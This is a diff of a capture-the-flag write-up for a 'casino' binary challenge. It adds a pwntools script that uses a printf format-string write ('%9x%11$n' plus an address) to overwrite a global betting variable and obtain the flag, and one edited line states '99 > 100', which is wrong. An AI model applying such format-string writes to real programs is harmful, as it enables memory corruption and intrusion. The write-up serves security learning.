@@ -301,7 +301,7 @@ To sum it up:
 * For each correct solve, increment var58 with the value of `bet`.
 * This value will be 99 when we have entered 100 correct numbers.
 
-So the condition will always fail as `99 <= 100`.
+So the condition will always fail (99 > 100).
 
 This is where I got stuck and my time ran out. So I sent all the code that I had to my teammate @happysox who found a printf format string vulnerability in the name. 
 
@@ -312,19 +312,24 @@ This means the condition that failed earlier `99 <= 100` will pass if we manage 
 
 But wait, wasn't full Full Relro enabled? Yes it is, but we can write to global variables, that is allowed.
 
-**What do we want to do and what do we know?**
+#### What do we know?
+
 * `bet` located at address `0x602020`
-* Overwrite `bet` with > 1
 * Buffer limited to 16 characters
 * printf stops at \00
 * Name located at offset 10 on the stack.
+
+#### What do we want to do?
+
+* Overwrite `bet` with > 1
+
 
 What is worth noting is that the address `0x602020` is actually `0x000000602020` but we can specify to target the lower bytes by writing to offset 11 instead.
 
 Here we write the value 9 to the address `0x602020`:
 
 ```
-`%9x%11$n + p64(0x602020)`.
+%9x%11$n + p64(0x602020)
 ```
 
 We also need to remember to update the `bet` variable in our seed.
@@ -333,12 +338,30 @@ We also need to remember to update the `bet` variable in our seed.
 int win = (upper >> 0x3) + 9;
 ```
 
-This will make the condition pass with flying colors:
+#### Getting the flag
 
-9*100 <= 100.
+```python
+from pwn import * 
 
+s = process("./solve") 
+p = process("./casino")
+
+numbers = s.recvall().split("\n")
+del numbers[-1]
+del numbers[-1]
+s.close()
+
+p.sendlineafter("name?", "%9x%11$n" + p64(0x602020))
+
+for i in numbers:
+    print p.recvuntil("number:")
+    p.sendline(i)
+print p.recvall()
+
+p.close()
+```
 
 ![alt text](img/4.png "Chall")
 
 
-Thanks again to @happysox for exploiting the pritnf vulnerability and solving the final steps of the challenge!
+Thanks again to @happysox for exploiting the printf vulnerability and solving the final steps of the challenge!
